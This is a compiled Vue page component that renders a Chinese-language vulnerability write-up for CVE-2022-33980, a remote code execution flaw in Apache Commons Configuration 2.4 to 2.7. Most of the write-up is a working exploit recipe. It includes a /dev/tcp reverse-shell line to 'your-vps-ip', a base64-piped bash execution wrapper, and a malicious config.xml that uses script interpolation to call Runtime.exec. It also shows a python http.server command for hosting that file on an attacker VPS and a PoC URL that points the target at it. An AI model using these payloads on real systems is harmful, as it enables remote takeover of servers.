import{_ as e}from"./plugin-vue_export-helper-c27b6911.js";import{o as a,c as i,e as t}from"./app-58e4a7d6.js";const n={},s=t(`<h2 id="漏洞描述" tabindex="-1"><a class="header-anchor" href="#漏洞描述" aria-hidden="true">#</a> 漏洞描述</h2><p>Apache Commons Configuration 是 Apache 基金会下的一个开源项目组件。它提供了一种通用的方式，让 Java 开发者可以使用统一的接口读取不同类型的配置文件。</p><p>该漏洞是由于 Apache Commons Configuration 提供的 Configuration 变量解释功能存在缺陷，攻击者可利用该漏洞在特定情况下，构造恶意数据执行远程代码。</p><h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>2.4 &lt;= Apache Commons Configuration &lt;=2.7
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>java payload：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code># bash -i &gt;&amp; /dev/tcp/your-vps-ip/port 0&gt;&amp;1
bash -c {echo,&lt;YOUR_PAYLOAD_HERE&gt;}|{base64,-d}|{bash,-i}
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>config.xml：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot; ?&gt;
&lt;configuration&gt;
        &lt;path&gt;\${script:js:java.lang.Runtime.getRuntime().exec(&quot;bash -c {echo,&lt;YOUR_PAYLOAD_HERE&gt;}|{base64,-d}|{bash,-i}&quot;)}&lt;/path&gt;
&lt;/configuration&gt;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>vps 开启 8888 端口托管 config.xml：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>python -m http.server 8888
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>poc：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>http://vuln-ip/Url?url=http://your-vps-ip:8888/config.xml&amp;data=path
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20240126181851899.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,15),d=[s];function r(l,o){return a(),i("div",null,d)}const p=e(n,[["render",r],["__file","Apache Commons Configuration 远程命令执行漏洞 CVE-2022-33980.html.vue"]]);export{p as default};
